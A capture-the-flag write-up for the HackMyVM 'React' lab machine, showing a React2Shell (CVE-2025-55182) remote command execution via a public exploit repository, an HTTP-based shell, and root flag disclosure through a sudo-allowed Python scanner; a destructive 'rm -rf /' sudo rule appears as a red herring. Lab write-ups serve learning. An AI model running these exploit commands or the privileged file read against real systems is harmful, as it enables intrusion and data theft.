# React-HMV: [React](https://hackmyvm.eu/machines/machine.php?vm=React)

---

## Overview

This write-up documents the compromise of the **React** machine from HackMyVM.  
The target exposes a vulnerable **React / Next.js Server Components** application which allows **remote command execution** via the React2Shell vulnerability.  
Privilege escalation to root is achieved through a **logic flaw in a sudo-allowed Python scanner**, resulting in **privileged file disclosure**.

---

## Enumeration

Enumeration was performed using a custom automation tool called `hmv`, which handles network discovery and Nmap scans.

```zsh
hmv react
```

### Nmap Scan

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3
80/tcp   open  http    Apache httpd 2.4.62
3000/tcp open  http    React / Next.js application
```

### Summary

- SSH on port **22**
- Apache HTTP server on port **80** (ping/diagnostic page)
- React / Next.js application on port **3000**

---

## Web Enumeration

### Port 80

Browsing `http://react.hmv` reveals a simple ping/diagnostic page with no direct attack surface.

---

### Port 3000 – React Application

Port **3000** exposes a React / Next.js application.  
Based on the behavior and error responses, the application was suspected to be vulnerable to **React Server Components (RSC)** exploitation.

---

## React2Shell (CVE-2025-55182 / CVE-2025-66478)

A public exploit framework was used to validate and exploit the vulnerability.

```zsh
git clone https://github.com/freeqaz/react2shell.git
cd react2shell
```

### Detection

```zsh
./detect.sh http://react.hmv:3000
```

The server responds with HTTP 500 errors and the characteristic `E{"digest"}` pattern, confirming vulnerability.

---

## Remote Command Execution

### Proof of RCE

```zsh
./exploit-redirect.sh -q http://192.168.56.104:3000 "id"
```

```text
uid=1000(bot) gid=1000(bot) groups=1000(bot)
```

```zsh
./exploit-redirect.sh -q http://192.168.56.104:3000 "pwd"
```

```text
/opt/target
```

---

## Interactive Shell

An interactive HTTP-based shell can be obtained:

```zsh
./shell.sh http://react.hmv:3000
```

```text
User: bot
Host: React
CWD:  /opt/target
```

---

## User Flag

The user flag is located in the home directory of the `bot` user:

```text
/home/bot/user.txt
```

---

## Privilege Escalation (bot → root)

### Sudo Permissions

```zsh
sudo -l
```

```text
User bot may run the following commands on React:
(ALL) NOPASSWD: /opt/react2shell/scanner.py
(ALL) NOPASSWD: /usr/bin/rm -rf /
```

The `rm -rf /` rule is a deliberate red herring.  
The real attack surface is the **root-executed Python scanner**.

---

## Analysis of scanner.py

The scanner script accepts user-controlled file paths via the `-l` option:

```python
with open(hosts_file, "r") as f:
    hosts.append(line.strip())
```

Each line is interpreted as a “host” and later reflected back in program output, even when errors occur.

This results in a **privileged file disclosure vulnerability**:
> Root reads an arbitrary file and reflects its contents to an unprivileged user.

---

## Root Flag Disclosure

By supplying `/root/root.txt` as input:

```zsh
sudo /opt/react2shell/scanner.py -v -l /root/root.txt
```

The scanner attempts to resolve the flag as a hostname, fails DNS resolution, and prints the content directly:

```text
flag{root-DEDUCTED}
```

---

## Flags

- **User:** `/home/bot/user.txt`
- **Root:** `/root/root.txt`

---

## Conclusion

This machine highlights:

- Exploitation of a **modern React RSC vulnerability**
- The dangers of **sudo-allowed scripts with unchecked file input**
- That **root shells are not always required** to fully compromise a system

---

## Attack Path Summary

```
React RSC RCE (port 3000)
        ↓
Shell as user bot
        ↓
Sudo NOPASSWD Python scanner
        ↓
Privileged file disclosure
        ↓
Root flag
```
